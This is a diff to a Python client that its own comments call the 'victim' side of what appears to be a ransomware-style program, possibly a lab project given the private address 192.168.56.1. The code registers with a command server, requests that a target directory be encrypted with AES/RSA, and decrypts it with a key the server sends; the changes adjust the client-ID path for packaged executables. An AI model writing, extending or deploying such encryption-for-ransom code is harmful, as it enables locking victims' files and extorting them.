@@ -6,7 +6,14 @@ import RSA_algorithm
 #setup configure for victim
 SERVER_IP = "192.168.56.1"
 SERVER_PORT = 6967
-CLIENT_ID_FILE = ".client_uuid"
+
+if getattr(sys, "frozen", False):
+    BASE_DIR = os.path.dirname(sys.executable)
+else:
+    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+CLIENT_ID_FILE = os.path.join(BASE_DIR, ".client_uuid")
+
 
 #checking type os for path handling using sys.platform
 platform = sys.platform
@@ -59,10 +66,9 @@ def register_and_encrypt():
 
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(5)  # <-- ADD THIS
+            s.settimeout(5) 
             s.connect((SERVER_IP, SERVER_PORT))
-            
-
+    
             send_json(s, {
                 "client_id": CLIENT_UUID,
                 "action": "request_encryption"
@@ -117,7 +123,6 @@ def decrypt_with_key(hex_key):
 
     aes_key = bytes.fromhex(hex_key)
     AesAlgorithm.decrypt_directory(str(TARGET_DIR), aes_key)
-
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((SERVER_IP, SERVER_PORT))
         send_json(s, {
